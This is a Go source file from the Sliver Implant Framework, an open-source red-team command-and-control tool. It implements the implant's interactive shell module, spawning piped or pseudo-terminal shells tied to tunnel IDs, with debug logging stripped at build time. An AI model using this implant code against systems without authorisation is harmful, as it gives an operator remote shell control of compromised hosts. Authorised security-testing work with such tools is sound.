package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}

	"os"
	"os/exec"

	// {{if ne .GOOS "windows"}}
	"runtime"

	"github.com/bishopfox/sliver/sliver/shell/pty"
	// {{end}}
)

const (
	readBufSize = 1024
)

// Shell - Struct to hold shell related data
type Shell struct {
	ID      uint64
	Command *exec.Cmd
	Stdout  io.ReadCloser
	Stdin   io.WriteCloser
}

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {

	// {{if ne .GOOS "windows"}}
	if enablePty && runtime.GOOS != "windows" {
		return ptyShell(tunnelID, command)
	}
	// {{end}}

	return pipedShell(tunnelID, command)
}

func pipedShell(tunnelID uint64, command []string) *Shell {
	// {{if .Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	var cmd *exec.Cmd
	cmd = exec.Command(command[0], command[1:]...)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	cmd.Start()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  stdout,
		Stdin:   stdin,
	}
}

// {{if ne .GOOS "windows"}}
func ptyShell(tunnelID uint64, command []string) *Shell {
	// {{if .Debug}}
	log.Printf("[ptmx] %s", command)
	// {{end}}

	var cmd *exec.Cmd
	cmd = exec.Command(command[0], command[1:]...)
	ptmx, err := pty.Start(cmd)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[ptmx] %v, falling back to piped shell...", err)
		// {{end}}
		return pipedShell(tunnelID, command)
	}
	cmd.Start()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  ptmx,
		Stdin:   ptmx,
	}
}

// {{end}}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
